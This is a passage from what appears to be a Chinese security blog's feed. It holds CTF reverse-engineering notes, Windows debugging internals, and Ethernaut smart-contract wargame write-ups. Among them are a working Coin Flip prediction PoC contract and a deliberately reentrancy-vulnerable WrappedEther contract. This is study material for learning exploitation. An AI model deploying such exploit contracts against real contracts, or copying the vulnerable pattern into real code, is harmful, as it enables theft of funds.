class="built_in">connect</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;connect success&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Login <span class="title">login</span><span class="params">(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;login), <span class="built_in">sizeof</span>(Login), <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;send error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LoginResult loginResult;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(servSock, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(&amp;loginResult), <span class="built_in">sizeof</span>(LoginResult), <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;recv error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; loginResult.loginResultNum &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Select可以让服务端链接多个客户端</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="开发" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="语言学习" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    <category term="CPP" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/CPP/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="cpp" scheme="https://www.pri87.vip/tags/cpp/"/>
    
    <category term="网络" scheme="https://www.pri87.vip/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="cs" scheme="https://www.pri87.vip/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>吾爱2025解题领红包5windows高级题简要分析</title>
    <link href="https://www.pri87.vip/posts/43ad3f3c.html"/>
    <id>https://www.pri87.vip/posts/43ad3f3c.html</id>
    <published>2025-02-16T12:56:18.000Z</published>
    <updated>2025-02-19T19:45:32.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这个题很有意思<br>但是第一关就卡了我很久<br>这里记录一下我是怎么分析的</p><h2 id="壳">壳</h2><p>这个壳的反调试部分在TlsCallback_0函数的第二次call rax中<br>7FF708E27DB0这个函数,通过7FF708E26280判断是否有调试和7FF708E244A0判断是否有hook,然后获得一个标志位放到flag_a中</p><p><img src="https://s2.loli.net/2025/02/16/WV1t7PzX5OiGBDK.png" alt="image-20250216210356149"></p><p>在jmp rax中跳转到7FF708E24400执行setThreadInfomation函数的位置,传参是-(flag_a != 1) ^ 0x11<br>如果标志位为1说明是调试,会直接触发hidefromdebug效果,如果标志为2则会传入错误的setInfomatinon值,最后会传出0xC000003导致显示环境异常.如果标志为5,表明正常不会进行检查.</p><p>第二点,这里调试的时候如果对后面SMC解密的代码下了断点0xcc,则会导致它还原失败,所以这里是不能提前下断点的</p><h2 id="流程分析">流程分析</h2><p>通过hook getItemDialog函数的ret，可以找到按钮按下时哪里读取了，这里对flag进行了检查，然后生成了一个结构放入临界区就结束了。说明这是多线程的程序</p>]]></content>
    
    
    <summary type="html">一道好题</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>win-调试原理</title>
    <link href="https://www.pri87.vip/posts/6e648a52.html"/>
    <id>https://www.pri87.vip/posts/6e648a52.html</id>
    <published>2025-02-10T06:12:33.000Z</published>
    <updated>2025-02-27T07:03:08.615Z</updated>
    
    <content type="html"><![CDATA[<h2 id="X86的主要调试设施">X86的主要调试设施</h2><p>INT 3 指令   软件断点基础<br>追踪标志TF   单步追踪的基础<br>调试寄存器   硬件寄存器的基础<br>分支监视和记录   按分支单步的基础</p><h2 id="软件断点">软件断点</h2><p>0xCC int3指令<br>机器码为1字节，无数量限制，只支持代码段(可执行的段)，且不支持在只读存储器中使用</p><p>将一个int 3 写入，触发异常break之后会被恢复，再执行后会再次写入</p><h2 id="硬件断点">硬件断点</h2><p>通过调试寄存器实现，DR0到DR3 的四个寄存器中存放目标地址<br>DR7有8组设置标志位，每组分别有2个2位标志，其中一个标志表示R/W，另一个标志表示长度<br>CPU每执行1步就进行一次匹配，如果是这个地址，模式正确，就会写入DR6的标志位，然后触发断点(产生1号异常)，操作系统通过检查标志位知道哪一个命中了断点</p><p>由于每个线程的寄存器信息独立保存，所以每个线程都可以设4个地址</p><h2 id="陷阱标志">陷阱标志</h2><p>标志寄存器efl(ag)的TF位<br>单步异常在efl的最低位。每当efl最后一位是1，系统会自动置0，然后触发单步异常</p><h2 id="异常">异常</h2><p>前面几节已经差不多说明了，这里就不赘述了。不过在程序中，尤其是VS生成的代码，一般来说低级的异常往往会封装成Cxx异常。</p><h3 id="中断向量表">中断向量表</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>除零异常</span><br><span class="line"><span class="symbol">1 </span>调试异常</span><br><span class="line"><span class="symbol">3 </span>断点异常</span><br><span class="line"><span class="symbol">4 </span>溢出异常</span><br><span class="line"><span class="symbol">5 </span>数组越界异常</span><br><span class="line"><span class="symbol">6 </span>非法指令异常</span><br><span class="line"><span class="symbol">13 </span>保护异常</span><br><span class="line"><span class="symbol">14 </span>缺页异常</span><br><span class="line"><span class="symbol">18 </span>机器检查异常</span><br><span class="line"><span class="number">32</span>-<span class="number">255</span> 用户自定义，很多是中断，而不是异常</span><br></pre></td></tr></table></figure><h3 id="来源">来源</h3><p>CPU产生 执行指令检测到的错误，机器异常，调试异常等<br>程序产生，RaiseException win32api<br>C++ throw E</p><h2 id="JTAG">JTAG</h2><p>硬件调试标准</p><h2 id="用户态调试模型XP">用户态调试模型XP</h2><p>断点命中时，CPU立即切换到内核执行一系列异常处理函数。其中KISystemService调用KiRaiseException()产生异常KiDebugService和KiTrap04~00做分发准备。KiDispatchException()是分发中枢，会通知用户态调试子系统Dbgk，然后触发DbgkForwardExcption()，如果有调试器执行DbgkpSendApiMessages()继续传递，到DbgkQueueMessage()生成调试事件并将产生的调试对象挂到内核调试对象队列中。调试器一直等待这个队列，有调试对象时就会取出并处理。</p><h3 id="调试器的载入程序">调试器的载入程序</h3><p>一般情况下，会在目标进程创建一个线程执行int 3，但是系统在分发异常时会冻结所有线程</p><h2 id="KiDisPatchException">KiDisPatchException</h2><p>用户态异常内含2轮异常分发：<br>第一轮：</p><p>如果没有用户态调试器，尝试分发给内核调试器<br>DbgkForwardException尝试交给用户态调试器<br>复制栈帧然后改程序指针到KeUserExceptionDispatcher到用户态</p><p>第二轮：</p><p>DbgkForwardException尝试交给用户态调试器<br>然后尝试交给服务进程，让服务进程做最后处理，一般直接杀死<br>如果还是不处理，直接调用ZwTerminateProcess在内核态杀死</p><blockquote><p>产生硬件异常通过 IDT调用异常处理例程， 产生软件异常通过 API的层层调用产地异常信息。而异常又由于发生位置不同，分为内核异常和用户态异常，二者最后都会靠 <code>kiDispathException</code>函数来进行异常分发；<br>当内核产生异常时，程序处理流程进入到 <code>KiDispatchException</code>函数，在该函数内备份当前线程 R3 的 <code>TrapFrame</code>（即栈帧的基址）。异常处理首先判断这是否是第一次异常，判断是否存在内核调试器，如果有内核调试器，则把当前的异常信息发送给内核调试器；如果没有内核调试器或者内核调试器没有处该异常 ， 则进入步骤3，调用 <code>RtlDispatchException</code>。<br>内核异常进入 <code>RtlDispatchException</code> 函 数， 如果<code>RtlDispatchException</code> 函数没有处理该异常，那么将再次尝试将异常发送到内核调试器，如果此时内核调试器仍然不存在或者没有处理该异常，那么此时系统会直接蓝屏；<br>如果是用户态异常则经过 <code>KiDispatchException</code>进行用户态异常分发和处理。如果是第一次分发异常，则调用 <code>DbgKForwardException</code>将异常分发到内核调试器；如果内核调试器不存在或没有处理异常，则尝试将异常分发给用户态调试器；如果异常被处理，则进入步骤10；如果用户态调试器不存在或未处理异常，则检测是否是第一次处理异常，如果是第一次处理异常则进入第5步中的异常数据准备；<br>准备一个返回ntdll!<code>KiUserExceptionDispatcher</code> 函数的应用层调用栈，结束本次<code>KiDispatchException</code> 函数的运行，调用<code>KiServiceExit</code> 返回用户层。此时函数栈帧是ntdll!<code>KiUserExceptionDispatcher</code>的执行环境，用户态线程从执行 ntdll!<code>KiUserExceptionDispatcher</code> 开始执行。该函数调用 ntdll!RtlDispatchException进行异常的分发，进入第 6 步；<br>通过 <code>RtlCallVectoredExceptionHandlers</code>遍历 VEH链表尝试查找异常处理函数；如果 VEH未处理异常。则从 fs[0]读取 ExceptionList并开始执行 SEH 函数处理，进入步骤7；<br>如果SEH没有处理函数处理该异常，则检查用户是否通过<code>SetUnhandledExceptionFilter</code>函数注册过进程的异常处理函数，如果用户注册过异常处理函数，调用该异常处理函数，如果异常没有被成功处理或没有自定义的异常处理函数，则进入步骤3；<br>如果最后仍没有处理该异常，便会主动调用 <code>NtRaiseException</code>将该异常重新跑出来，但是此时不是第一次分发，此时 <code>NtRaiseException</code>流程重新调用了 ntdll!<code>KiDispatchException</code>，并再次进入用户态异常的处理分支，进入步骤9；<br>第二次进入用户态异常处理时，不会再尝试发送到内核调试器，也不会再进行异常分发，而是直接尝试发送到用户态体异常调试器，如果最后异常仍未被处理则进入步骤11；<br>异常被处理，调用 NtContine，将之前保存的 TrapFrame还原，程序继续从异常处正常运行；<br>异常不能被处理，系统调用 ntdll!<code>KiDispatchException</code> 调用 ZeTerminateProcess结束进程。</p></blockquote><hr><h2 id="WinDbg常见指令">WinDbg常见指令</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t step into</span><br><span class="line">p step over</span><br><span class="line">g run</span><br><span class="line">g <span class="keyword">addr </span>转到指定位置</span><br><span class="line"><span class="keyword">bp </span><span class="keyword">addr </span>下软件断点</span><br><span class="line"><span class="keyword">ba </span><span class="keyword">addr </span>下硬件断点</span><br><span class="line">r 显示寄存器</span><br><span class="line">r register 显示指定寄存器</span><br><span class="line">u 显示下一条指令</span><br><span class="line">u <span class="keyword">addr </span>看对应地址指令</span><br><span class="line">u L10 显示下<span class="number">10</span>行指令</span><br><span class="line">ub 显示上一条指令</span><br><span class="line">k 看栈回溯</span><br><span class="line">~* 看当前线程</span><br><span class="line">~num k 看某个（序号为num）线程的栈回溯</span><br><span class="line">x moduleName!*funcName 在对应位置设置断点</span><br><span class="line"><span class="keyword">bp </span>moduleName!funcName <span class="string">&quot;指令&quot;</span> 断点命中后执行指令,比如<span class="string">&quot;.echo *********;k;gc&quot;</span>自动k然后go</span><br><span class="line">sxe ld 模块加载时停止</span><br><span class="line">lm 显示加载的模块</span><br><span class="line">dt (<span class="keyword">display </span>type)显示类型</span><br><span class="line">dt struct name 显示结构成员</span><br><span class="line">dt struct name <span class="keyword">address </span>将目标地址当作结构体显示</span><br></pre></td></tr></table></figure><p>以Noninvasive模式可以只读的形式附加</p><h2 id="参考资料">参考资料</h2><p><a href="https://www.bilibili.com/video/BV1A4411D7xx?p=2">2.概览和软件断点_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/573449712">windows SEH分析 - 知乎</a></p><p><a href="https://blog.csdn.net/LPWSTR/article/details/78714486?spm=1001.2014.3001.5501">Windows异常世界历险记（二）——Win32用户层下SEH机制之对RtlUnwind的逆向分析-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">调试的原理</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="Win内核" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/Win%E5%86%85%E6%A0%B8/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全0-入门</title>
    <link href="https://www.pri87.vip/posts/3cedd4ae.html"/>
    <id>https://www.pri87.vip/posts/3cedd4ae.html</id>
    <published>2025-02-09T06:42:19.000Z</published>
    <updated>2025-02-19T19:45:32.264Z</updated>
    
    <content type="html"><![CDATA[<h1>交互</h1><h2 id="以太坊生态">以太坊生态</h2><p>以太坊是一个去中心化,开源且具备智能合约功能的公共区块链平台.</p><h2 id="MetaMask">MetaMask</h2><p>钱包</p><h2 id="助记词-Seed-私钥-公钥-地址">助记词/Seed/私钥/公钥/地址</h2><p>助记词—Seed种子(可逆)<br>生成私钥(单向)<br>生成公钥<br>生成地址</p><h2 id="转账">转账</h2><h2 id="智能合约">智能合约</h2><p>使以太网生态有图灵完备性</p><h3 id="REMIX">REMIX</h3><p>使用的语言:solidity</p><p>inject Provider - MetaMask<br>连接Remix和MetaMask</p><h1>刷题</h1><p><a href="https://ethernaut.openzeppelin.com/level/1">The Ethernaut - Fallback</a></p><h3 id="Fallback">Fallback</h3><p>智能合约也是账户，可以直接转账</p><h3 id="Fallout">Fallout</h3><p>除了constructor函数以外，所有函数都可以调用，在0.8版本之前，如果拼错了构造函数，会导致这个函数可以被直接调用</p><h3 id="Coin-Flip">Coin Flip</h3><p>由于区块链中的很多数据是对所有人可见的，基于这些可见数据进行的伪随机可以很轻松地被预测到下一个随机数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PoC &#123;</span><br><span class="line">    CoinFlip target;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function flip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">区块链入门</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="区块链" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.pri87.vip/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://www.pri87.vip/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全1-做题</title>
    <link href="https://www.pri87.vip/posts/2967681d.html"/>
    <id>https://www.pri87.vip/posts/2967681d.html</id>
    <published>2025-02-09T06:42:19.000Z</published>
    <updated>2025-02-19T19:45:32.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level4-Telephone">level4 Telephone</h2><p>tx.addr是原始调用者<br>msg.sender是调用这个合约的调用者</p><p>可以通过让合约调用合约来实现tx.origin不等于msg.sender</p><h2 id="level5-Token">level5 Token</h2><p>减法和加法有溢出，但是0.8版本有内置的检查</p><h2 id="level6-Delegation">level6 Delegation</h2><p>fallback函数<br>函数选择器<br>底层通过不同的值选择不同的函数执行，从而实现执行不同的合约的函数</p><p>委托调用，直接执行目标代码的机器码</p><h2 id="level7-Force">level7 Force</h2><p>如果一个合约没有receive函数，那么就不能向这个合约转账</p><p>但是有一个自毁函数可以把本合约销毁然后将自身以太币发送到指定地址</p><p>selfdestruct(payable _(_to))</p><h2 id="level8-Vault">level8 Vault</h2><p>合约上的所有内容都是公开的，所以可以直接通过查看交易记录得到每一个存放的值</p><h3 id="solidity内存排布">solidity内存排布</h3><p>由变量声明顺序由上至下申请空间，每个插槽32byte，如果插槽位置不够了，就新申请一个，放在新申请的里面</p><p>数组，通过计算keccak§得到初始地址，然后再增加index值</p><h2 id="重入攻击">重入攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface IWrappedEther &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Deposit(address indexed from, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender</span><br><span class="line">    ) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract WrappedEther is IWrappedEther &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable &#123;</span><br><span class="line">        balanceOf[to] += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        sendEth(payable(msg.sender), amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external &#123;</span><br><span class="line">        sendEth(payable(msg.sender), balanceOf[msg.sender]);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        emit Withdraw(msg.sender, balanceOf[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(msg.sender, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        require(</span><br><span class="line">            allowance[from][msg.sender] &gt;= amount,</span><br><span class="line">            &quot;insufficient allowance&quot;</span><br><span class="line">        );</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        allowance[from][msg.sender] -= amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable to, uint256 amount) private &#123;</span><br><span class="line">        (bool success, ) = to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;failed to send ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在withdrawAll的时候触发，先转账，后withdraw，所以可以在receive再调用这个withdrawAll函数导致多次执行操作。</p>]]></content>
    
    
    <summary type="html">区块链入门</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="区块链" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="区块链" scheme="https://www.pri87.vip/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://www.pri87.vip/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>湘岚杯RE-复现&lt;1997&gt;</title>
    <link href="https://www.pri87.vip/posts/b119ee64.html"/>
    <id>https://www.pri87.vip/posts/b119ee64.html</id>
    <published>2025-01-29T05:26:50.000Z</published>
    <updated>2025-01-29T05:43:40.516Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1997">1997</h2><p>这个题是一个魔改的AES，具体逻辑很清楚，甚至还有符号表</p><p>但是中间这里没想到有什么方法可以逆向，所以直接爆破了</p><p>列混淆：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">  ciphertext[i] = t ^ tmp[i] ^ mul2(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ mul2(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ mul2(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ mul2(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure 